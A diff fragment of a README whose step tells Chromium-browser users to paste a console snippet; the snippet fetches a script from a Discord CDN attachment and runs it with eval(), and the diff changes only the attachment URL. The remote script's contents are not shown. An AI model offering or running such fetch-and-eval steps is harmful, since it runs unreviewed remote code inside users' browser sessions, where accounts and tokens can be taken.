@@ -42,7 +42,7 @@ the following steps should work on most Chromium-based browsers such as Chrome, 
 2. copy this script
 
     ```js
-    fetch("https://cdn.discordapp.com/attachments/897505826330255431/1089766049391579216/duts.js")
+    fetch("https://cdn.discordapp.com/attachments/897505826330255431/1092167886853898310/duts.js")
     	.then((r) => r.text())
     	.then((d) => eval(d))
     ```
